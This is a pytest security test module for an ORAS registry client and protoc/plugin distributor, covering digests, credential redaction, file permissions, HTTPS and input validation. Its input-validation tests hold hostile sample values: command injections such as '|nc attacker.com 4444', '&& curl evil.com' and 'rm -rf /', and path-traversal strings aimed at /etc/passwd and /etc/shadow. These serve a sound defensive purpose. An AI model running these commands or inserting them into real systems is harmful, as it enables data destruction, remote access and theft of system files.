"""
ORAS Security Testing

This module provides comprehensive security testing for ORAS components including
vulnerability scanning, authentication testing, content verification, and secure practices.
"""

import hashlib
import pytest
import tempfile
import os
import stat
from pathlib import Path
from typing import Dict, Any, List
from unittest.mock import patch, Mock

from . import PERFORMANCE_TARGETS


class TestContentVerification:
    """Test content verification and integrity checking."""
    
    @pytest.mark.security
    def test_digest_verification(self, real_oras_client, security_validator, test_artifacts):
        """Test SHA256 digest verification for downloaded artifacts."""
        if not test_artifacts:
            pytest.skip("No test artifacts available for digest verification")
        
        for artifact_name, artifact_info in test_artifacts.items():
            try:
                # Pull artifact
                artifact_path = real_oras_client.pull(artifact_info["ref"])
                
                # Get artifact metadata
                info = real_oras_client.get_artifact_info(artifact_info["ref"])
                
                if "digest" in info and Path(artifact_path).exists():
                    # Read artifact content
                    with open(artifact_path, 'rb') as f:
                        content = f.read()
                    
                    # Verify digest matches
                    is_valid = security_validator.validate_digest(content, info["digest"])
                    assert is_valid, f"Digest verification failed for {artifact_name}"
                
            except Exception as e:
                # Skip if artifacts not available, but log the reason
                pytest.skip(f"Digest verification test skipped for {artifact_name}: {e}")
    
    @pytest.mark.security
    def test_corrupted_content_detection(self, protoc_distributor, current_platform):
        """Test detection of corrupted content."""
        version = "24.4"
        
        # Download artifact normally
        original_path = protoc_distributor.get_protoc(version, current_platform)
        
        if Path(original_path).exists():
            # Corrupt the content
            with open(original_path, 'wb') as f:
                f.write(b"CORRUPTED_CONTENT_FOR_TESTING")
            
            # Try to use corrupted artifact - should detect corruption
            try:
                # Attempt to get the same artifact again
                # Implementation should detect corruption and re-download
                new_path = protoc_distributor.get_protoc(version, current_platform)
                
                # If successful, verify the content is no longer corrupted
                if Path(new_path).exists():
                    with open(new_path, 'rb') as f:
                        content = f.read()
                    assert content != b"CORRUPTED_CONTENT_FOR_TESTING"
                
            except Exception as e:
                # Should fail gracefully with corruption detection
                error_msg = str(e).lower()
                corruption_keywords = ["corrupt", "invalid", "checksum", "verification", "integrity"]
                assert any(keyword in error_msg for keyword in corruption_keywords)
    
    @pytest.mark.security
    def test_size_verification(self, real_oras_client, test_artifacts):
        """Test that downloaded content matches expected size."""
        if not test_artifacts:
            pytest.skip("No test artifacts available for size verification")
        
        for artifact_name, artifact_info in test_artifacts.items():
            try:
                artifact_path = real_oras_client.pull(artifact_info["ref"])
                
                if Path(artifact_path).exists():
                    actual_size = Path(artifact_path).stat().st_size
                    expected_size = artifact_info.get("size")
                    
                    if expected_size:
                        # Allow some tolerance for compression/metadata
                        size_diff = abs(actual_size - expected_size)
                        tolerance = max(1024, expected_size * 0.1)  # 10% or 1KB, whichever is larger
                        
                        assert size_diff <= tolerance, f"Size mismatch for {artifact_name}: expected {expected_size}, got {actual_size}"
                
            except Exception as e:
                pytest.skip(f"Size verification test skipped for {artifact_name}: {e}")


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    @pytest.mark.security
    def test_credential_handling(self, temp_cache_dir):
        """Test secure handling of credentials."""
        from oras_client import OrasClient
        
        # Test that credentials are not logged or exposed
        client = OrasClient(
            registry="oras.birb.homes",
            cache_dir=temp_cache_dir,
            username="test_user",
            password="secret_password"
        )
        
        # Check that password is not in string representation
        client_str = str(client)
        assert "secret_password" not in client_str
        assert "password" not in client_str.lower() or "***" in client_str
    
    @pytest.mark.security
    def test_token_security(self, temp_cache_dir):
        """Test secure handling of authentication tokens."""
        from oras_client import OrasClient
        
        # Test with token-based auth
        sensitive_token = "ghp_secrettoken123456789"
        
        client = OrasClient(
            registry="oras.birb.homes",
            cache_dir=temp_cache_dir,
            token=sensitive_token
        )
        
        # Token should not be exposed in string representation
        client_str = str(client)
        assert sensitive_token not in client_str
        assert "token" not in client_str.lower() or "***" in client_str
    
    @pytest.mark.security
    def test_unauthorized_access_handling(self, real_oras_client):
        """Test handling of unauthorized access attempts."""
        # Try to access private/protected resources
        protected_refs = [
            "oras.birb.homes/private/sensitive:latest",
            "oras.birb.homes/admin/tools:latest",
            "oras.birb.homes/internal/secrets:latest"
        ]
        
        for ref in protected_refs:
            with pytest.raises(Exception) as exc_info:
                real_oras_client.pull(ref)
            
            # Should get appropriate authentication error
            error_msg = str(exc_info.value).lower()
            auth_keywords = ["unauthorized", "forbidden", "auth", "permission", "access denied"]
            # Note: Might also get "not found" if registry hides protected resources
            not_found_keywords = ["not found", "404", "does not exist"]
            
            assert (any(keyword in error_msg for keyword in auth_keywords) or 
                   any(keyword in error_msg for keyword in not_found_keywords))


class TestFilePermissions:
    """Test file permission security."""
    
    @pytest.mark.security
    def test_cache_file_permissions(self, protoc_distributor, security_validator, current_platform):
        """Test that cached files have secure permissions."""
        version = "24.4"
        
        # Download artifact
        artifact_path = protoc_distributor.get_protoc(version, current_platform)
        
        if Path(artifact_path).exists():
            # Check file permissions
            is_secure = security_validator.validate_permissions(Path(artifact_path))
            assert is_secure, f"Insecure permissions on cached file: {artifact_path}"
            
            # Check that file is not world-writable
            file_mode = Path(artifact_path).stat().st_mode
            assert not (file_mode & stat.S_IWOTH), "Cached file should not be world-writable"
    
    @pytest.mark.security
    def test_cache_directory_permissions(self, protoc_distributor):
        """Test that cache directories have secure permissions."""
        cache_dir = protoc_distributor.cache_dir
        
        if cache_dir.exists():
            # Check directory permissions
            dir_mode = cache_dir.stat().st_mode
            
            # Directory should not be world-writable
            assert not (dir_mode & stat.S_IWOTH), "Cache directory should not be world-writable"
            
            # Directory should be readable/executable by owner
            assert dir_mode & stat.S_IRUSR, "Cache directory should be readable by owner"
            assert dir_mode & stat.S_IXUSR, "Cache directory should be executable by owner"
    
    @pytest.mark.security
    def test_executable_permissions(self, protoc_distributor, current_platform):
        """Test that downloaded executables have correct permissions."""
        version = "24.4"
        
        # Download protoc binary
        protoc_path = protoc_distributor.get_protoc(version, current_platform)
        
        if Path(protoc_path).exists() and current_platform.startswith(("linux", "darwin")):
            # On Unix systems, executable should have execute permissions
            file_mode = Path(protoc_path).stat().st_mode
            assert file_mode & stat.S_IXUSR, "Executable should have user execute permission"
            
            # Should not be world-writable
            assert not (file_mode & stat.S_IWOTH), "Executable should not be world-writable"


class TestSecretScanning:
    """Test for potential secrets and sensitive information."""
    
    @pytest.mark.security
    def test_no_hardcoded_secrets_in_source(self, security_validator):
        """Test that source code doesn't contain hardcoded secrets."""
        # Get the tools directory
        tools_dir = Path(__file__).parent.parent.parent / "tools"
        
        # Scan ORAS-related source files
        oras_files = [
            "oras_client.py",
            "oras_plugins.py", 
            "oras_protoc.py",
            "registry_manager.py"
        ]
        
        for filename in oras_files:
            file_path = tools_dir / filename
            if file_path.exists():
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Scan for potential secrets
                findings = security_validator.scan_for_secrets(content)
                
                # Filter out false positives (test data, examples, etc.)
                real_secrets = []
                for finding in findings:
                    # Skip obvious test/example data
                    if any(test_keyword in str(finding).lower() for test_keyword in 
                          ["test", "example", "mock", "placeholder", "dummy"]):
                        continue
                    real_secrets.append(finding)
                
                assert len(real_secrets) == 0, f"Potential secrets found in {filename}: {real_secrets}"
    
    @pytest.mark.security
    def test_no_secrets_in_logs(self, protoc_distributor, current_platform, caplog):
        """Test that sensitive information is not logged."""
        # Perform operations that might log sensitive data
        try:
            protoc_distributor.get_protoc("24.4", current_platform)
        except:
            pass  # Errors are OK, we're checking logs
        
        # Check logs for sensitive patterns
        log_content = caplog.text.lower()
        
        sensitive_patterns = [
            "password",
            "token", 
            "secret",
            "api_key",
            "apikey",
            "auth_token"
        ]
        
        for pattern in sensitive_patterns:
            if pattern in log_content:
                # Check if it's properly redacted
                assert "***" in log_content or "redacted" in log_content, f"Unredacted {pattern} found in logs"
    
    @pytest.mark.security
    def test_environment_variable_security(self):
        """Test that sensitive environment variables are handled securely."""
        # Test common sensitive environment variables
        sensitive_env_vars = [
            "ORAS_PASSWORD",
            "ORAS_TOKEN", 
            "REGISTRY_PASSWORD",
            "GITHUB_TOKEN",
            "API_KEY"
        ]
        
        for env_var in sensitive_env_vars:
            if env_var in os.environ:
                # If present, value should not be easily extractable
                # This is a basic check - real implementation would be more sophisticated
                value = os.environ[env_var]
                assert len(value) > 0, f"Empty sensitive environment variable: {env_var}"


class TestNetworkSecurity:
    """Test network security aspects."""
    
    @pytest.mark.security
    def test_https_enforcement(self, real_oras_client):
        """Test that HTTPS is enforced for registry communication."""
        # Check that registry URL uses HTTPS
        registry_url = real_oras_client.registry
        
        # Should use HTTPS for security
        if not registry_url.startswith("localhost") and not registry_url.startswith("127.0.0.1"):
            assert registry_url.startswith("https://") or not registry_url.startswith("http://"), \
                "Registry communication should use HTTPS"
    
    @pytest.mark.security
    def test_certificate_validation(self, real_oras_client, test_artifacts):
        """Test that SSL certificates are properly validated."""
        if not test_artifacts:
            pytest.skip("No test artifacts available for certificate validation test")
        
        # Attempt to connect to registry
        try:
            # This should validate certificates
            tags = real_oras_client.list_tags("buck2-protobuf/test/hello-world")
            # If successful, certificates were validated
            
        except Exception as e:
            error_msg = str(e).lower()
            
            # Should not have certificate errors (unless testing with self-signed certs)
            cert_error_keywords = ["certificate", "ssl", "tls", "verify failed"]
            
            if any(keyword in error_msg for keyword in cert_error_keywords):
                pytest.skip(f"Certificate validation test skipped due to cert issues: {e}")
            # Other errors (like 404, network) are fine
    
    @pytest.mark.security
    def test_no_insecure_protocols(self, temp_cache_dir):
        """Test that insecure protocols are rejected."""
        from oras_client import OrasClient
        
        insecure_registries = [
            "http://insecure-registry.com",
            "ftp://insecure-registry.com",
            "telnet://insecure-registry.com"
        ]
        
        for insecure_url in insecure_registries:
            try:
                client = OrasClient(registry=insecure_url, cache_dir=temp_cache_dir)
                
                # Should either reject insecure protocol or upgrade to secure
                with pytest.raises(Exception) as exc_info:
                    client.pull("test/artifact:latest")
                
                error_msg = str(exc_info.value).lower()
                # Should get security-related error
                security_keywords = ["insecure", "protocol", "https", "ssl", "security"]
                connection_keywords = ["connection", "resolve", "network"]
                
                # Either security error or connection error (can't reach insecure registry)
                assert (any(keyword in error_msg for keyword in security_keywords) or 
                       any(keyword in error_msg for keyword in connection_keywords))
                
            except Exception:
                # Any error is acceptable - shouldn't successfully connect to insecure registry
                pass


class TestInputValidation:
    """Test input validation and sanitization."""
    
    @pytest.mark.security
    def test_artifact_reference_validation(self, real_oras_client):
        """Test validation of artifact references to prevent injection attacks."""
        malicious_refs = [
            "../../etc/passwd",
            "test/artifact:latest; rm -rf /",
            "test/artifact:latest$(whoami)",
            "test/artifact:latest`cat /etc/passwd`",
            "test/artifact:latest|nc attacker.com 4444",
            "test/artifact:latest && curl evil.com",
            "test/artifact:latest; python -c 'import os; os.system(\"rm -rf /\")'",
            "../../../sensitive-data:latest"
        ]
        
        for malicious_ref in malicious_refs:
            with pytest.raises(Exception) as exc_info:
                real_oras_client.pull(malicious_ref)
            
            # Should reject malicious references
            error_msg = str(exc_info.value).lower()
            validation_keywords = ["invalid", "malformed", "illegal", "forbidden", "validation"]
            
            # Should get validation error, not execute the malicious content
            assert any(keyword in error_msg for keyword in validation_keywords) or \
                   "not found" in error_msg  # Also acceptable if registry rejects it
    
    @pytest.mark.security
    def test_path_traversal_prevention(self, protoc_distributor, current_platform):
        """Test prevention of path traversal attacks."""
        # Try to use path traversal in cache directory
        malicious_versions = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "24.4/../../../sensitive-file",
            "24.4/../../../../etc/shadow"
        ]
        
        for malicious_version in malicious_versions:
            try:
                with pytest.raises(Exception) as exc_info:
                    protoc_distributor.get_protoc(malicious_version, current_platform)
                
                # Should reject path traversal attempts
                error_msg = str(exc_info.value).lower()
                security_keywords = ["invalid", "illegal", "path", "traversal", "forbidden"]
                assert any(keyword in error_msg for keyword in security_keywords)
                
            except Exception:
                # Any error is acceptable - should not allow path traversal
                pass
    
    @pytest.mark.security
    def test_filename_sanitization(self, plugin_distributor, current_platform):
        """Test that filenames are properly sanitized."""
        # Try plugins with potentially dangerous names
        dangerous_names = [
            "plugin; rm -rf /",
            "plugin$(whoami)",
            "plugin`cat /etc/passwd`",
            "plugin|nc evil.com",
            "plugin && curl bad.com"
        ]
        
        for dangerous_name in dangerous_names:
            try:
                with pytest.raises(Exception) as exc_info:
                    plugin_distributor.get_plugin(dangerous_name, "1.0.0", current_platform)
                
                # Should reject dangerous plugin names
                error_msg = str(exc_info.value).lower()
                assert "unsupported" in error_msg or "invalid" in error_msg
                
            except Exception:
                # Any error is acceptable - should not process dangerous names
                pass


class TestPrivacyProtection:
    """Test privacy protection and data handling."""
    
    @pytest.mark.security
    def test_no_personal_data_in_logs(self, protoc_distributor, current_platform, caplog):
        """Test that personal data is not logged."""
        # Perform operations
        try:
            protoc_distributor.get_protoc("24.4", current_platform)
        except:
            pass
        
        log_content = caplog.text
        
        # Check for potential personal data patterns
        personal_data_patterns = [
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN-like
            r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',  # Credit card-like
            r'\b(?:\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}\b'  # Phone
        ]
        
        import re
        for pattern in personal_data_patterns:
            matches = re.findall(pattern, log_content)
            # Some false positives are OK, but check for obvious personal data
            for match in matches:
                # Skip obvious test/example data
                if any(test_word in match.lower() for test_word in ["test", "example", "dummy"]):
                    continue
                    
                # Real personal data should not be present
                pytest.fail(f"Potential personal data found in logs: {match}")
    
    @pytest.mark.security
    def test_cache_data_isolation(self, temp_cache_dir):
        """Test that cache data is properly isolated."""
        from oras_protoc import ProtocOrasDistributor
        from oras_plugins import PluginOrasDistributor
        
        # Create two distributors with different cache dirs
        cache1 = temp_cache_dir / "cache1"
        cache2 = temp_cache_dir / "cache2"
        
        distributor1 = ProtocOrasDistributor(cache_dir=str(cache1))
        distributor2 = ProtocOrasDistributor(cache_dir=str(cache2))
        
        # Verify they use different cache directories
        assert distributor1.cache_dir != distributor2.cache_dir
        
        # Verify cache directories are isolated
        if cache1.exists() and cache2.exists():
            # Should not share cache files
            cache1_files = set(p.name for p in cache1.rglob("*") if p.is_file())
            cache2_files = set(p.name for p in cache2.rglob("*") if p.is_file())
            
            # Some overlap is OK (same artifacts), but should be in different directories
            assert str(cache1) != str(cache2)


class TestVulnerabilityScanning:
    """Test for known vulnerabilities and security issues."""
    
    @pytest.mark.security
    def test_dependency_security(self):
        """Test that dependencies don't have known vulnerabilities."""
        # This would ideally integrate with tools like safety, bandit, etc.
        # For now, just check that we're not using obviously insecure practices
        
        # Check Python version (should be recent)
        import sys
        python_version = sys.version_info
        
        # Should be using Python 3.7+ (older versions have security issues)
        assert python_version.major >= 3, "Should use Python 3"
        assert python_version.minor >= 7, "Should use Python 3.7 or newer for security"
    
    @pytest.mark.security
    def test_temp_file_security(self, protoc_distributor, current_platform):
        """Test that temporary files are handled securely."""
        # Check that temp files are created securely
        import tempfile
        
        # Perform operation that might create temp files
        try:
            protoc_distributor.get_protoc("24.4", current_platform)
        except:
            pass
        
        # Check default temp directory permissions
        temp_dir = Path(tempfile.gettempdir())
        if temp_dir.exists():
            # Temp directory should exist and be accessible
            assert temp_dir.is_dir()
            
            # On Unix systems, check permissions
            if hasattr(os, 'getuid'):  # Unix systems
                temp_mode = temp_dir.stat().st_mode
                # Should be readable/writable by user
                assert temp_mode & stat.S_IRUSR
                assert temp_mode & stat.S_IWUSR
